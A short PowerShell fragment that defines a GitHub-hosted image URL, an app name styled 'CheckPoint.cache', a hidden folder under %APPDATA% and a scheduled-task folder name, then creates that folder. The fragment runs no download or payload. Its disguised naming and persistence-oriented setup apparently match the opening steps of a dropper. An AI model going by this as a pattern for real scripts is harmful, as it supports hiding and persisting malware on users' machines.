$url = "https://github.com/lunndal/goat/blob/main/img/62182405_10157124205655218_8035031504620879872_n.jpg"
$appName = "CheckPoint.cache"
$targtetDir =  "$env:APPDATA\$appName"
$schedTaskFolder = "$appName"

if (-not (Test-Path $targtetDir)) {
    New-Item -ItemType Directory -Path $targtetDir -Force
}